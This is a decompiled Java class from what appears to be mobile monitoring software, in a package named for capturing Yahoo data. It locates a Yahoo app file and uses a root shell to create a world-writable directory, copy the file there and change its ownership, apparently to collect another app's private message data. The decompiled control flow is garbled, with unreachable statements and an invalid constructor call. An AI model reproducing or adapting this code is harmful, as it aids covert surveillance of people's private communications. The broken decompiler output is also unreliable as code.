package com.vvt.capture.yahoo.b;

import com.vvt.io.p;
import com.vvt.shell.KMShell;
import com.vvt.shell.ShellUtil;
import java.io.File;

public class c
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.e;
  
  public static String a()
  {
    String[] arrayOfString = com.vvt.capture.yahoo.c.a();
    int i = arrayOfString.length;
    int j = 0;
    String str = null;
    int k = 0;
    if (k < i)
    {
      str = arrayOfString[k];
      boolean bool = ShellUtil.b(str);
      if (!bool) {}
    }
    for (;;)
    {
      return str;
      j = k + 1;
      k = j;
      break;
      j = 0;
      str = null;
    }
  }
  
  public static String a(String paramString)
  {
    return p.a(paramString, "yahoo");
  }
  
  public static String a(String paramString1, String paramString2, String paramString3, String paramString4)
  {
    String str1 = null;
    bool = ShellUtil.b(paramString1);
    if (bool) {}
    for (;;)
    {
      try
      {
        Object localObject = new java/io/File;
        ((File)localObject).<init>(paramString1);
        localObject = ((File)localObject).getName();
        str1 = p.a(paramString2, (String)localObject);
        localObject = "mkdir %s; chmod 777 %s; chown %s.%s %s";
        int i = 5;
        Object[] arrayOfObject = new Object[i];
        int j = 0;
        arrayOfObject[0] = paramString2;
        j = 1;
        arrayOfObject[j] = paramString2;
        j = 2;
        arrayOfObject[j] = paramString4;
        j = 3;
        arrayOfObject[j] = paramString4;
        j = 4;
        arrayOfObject[j] = paramString2;
        localObject = String.format((String)localObject, arrayOfObject);
        KMShell.a((String)localObject);
        bool = com.vvt.aa.a.c();
        if (bool) {
          ShellUtil.k(paramString2);
        }
        localObject = "%s cp %s %s; chmod 755 %s; chown %s.%s %s";
        i = 7;
        arrayOfObject = new Object[i];
        j = 0;
        String str2 = com.vvt.capture.yahoo.c.c(paramString3);
        arrayOfObject[0] = str2;
        j = 1;
        arrayOfObject[j] = paramString1;
        j = 2;
        arrayOfObject[j] = str1;
        j = 3;
        arrayOfObject[j] = str1;
        j = 4;
        arrayOfObject[j] = paramString4;
        j = 5;
        arrayOfObject[j] = paramString4;
        j = 6;
        arrayOfObject[j] = str1;
        localObject = String.format((String)localObject, arrayOfObject);
        KMShell.a((String)localObject);
        bool = com.vvt.aa.a.c();
        if (bool) {
          ShellUtil.k(str1);
        }
        bool = a;
        if (!bool) {}
      }
      catch (Exception localException)
      {
        bool = b;
        if (!bool) {
          continue;
        }
        continue;
      }
      return str1;
      bool = a;
      if (!bool) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/yahoo/removeFromPath/MyUncaughtExceptionHandler.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */